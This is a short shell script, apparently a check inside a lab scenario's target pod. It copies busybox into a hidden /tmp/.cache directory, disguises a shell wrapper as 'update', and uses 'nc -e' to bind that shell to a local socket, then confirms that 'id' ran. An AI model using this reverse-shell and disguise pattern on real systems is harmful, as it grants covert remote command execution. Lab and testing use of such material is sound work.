#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Lab use only. Runs inside the scenario's target pod.
# A listener sends two commands. nc -e runs one program without arguments,
# so it runs a two-line script whose interpreter is the copied busybox's sh
# applet, and the script replaces itself with that applet; the shell then
# has the socket as its stdin and stdout. busybox takes an applet as an
# argument only under its own name, hence the directory.
mkdir -p /tmp/.cache
cp /bin/busybox /tmp/.cache/busybox
printf '#!/tmp/.cache/busybox sh\nexec /tmp/.cache/busybox sh\n' >/tmp/.cache/update
chmod +x /tmp/.cache/update
(printf 'id\nexit\n' | nc -l -p 9001 >/tmp/shell-output 2>&1 &)
sleep 1
nc 127.0.0.1 9001 -e /tmp/.cache/update
sleep 1
echo "shell said: $(cat /tmp/shell-output)"
grep -q 'uid=' /tmp/shell-output || { echo "the shell did not run"; exit 99; }
